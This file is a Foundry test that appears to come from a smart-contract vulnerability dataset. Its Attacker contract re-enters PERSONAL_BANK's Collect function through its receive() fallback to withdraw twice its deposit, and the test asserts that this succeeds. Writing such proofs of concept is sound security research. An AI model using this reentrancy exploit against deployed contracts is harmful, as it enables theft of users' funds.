
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PERSONAL_BANK} from "../src/PERSONAL_BANK.sol";
import {LogFile} from "../src/PERSONAL_BANK.sol";

contract TestReentrancyPERSONAL_BANK is Test {

    PERSONAL_BANK public _contractUnderTest;

    Attacker public _attacker;

    function setUp() public {
        LogFile log = new LogFile();
        _contractUnderTest = new PERSONAL_BANK();
        _contractUnderTest.SetLogFile(address(log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= type(uint128).max / 2);
        
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PERSONAL_BANK public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = PERSONAL_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        storedVal = val;
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        victim.Collect(val);

        exploitSucceeded = (address(this).balance == initialSnapshot + 2 * val);
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(storedVal);
        } else {
            revert("Exploit end");
        }
    }
}
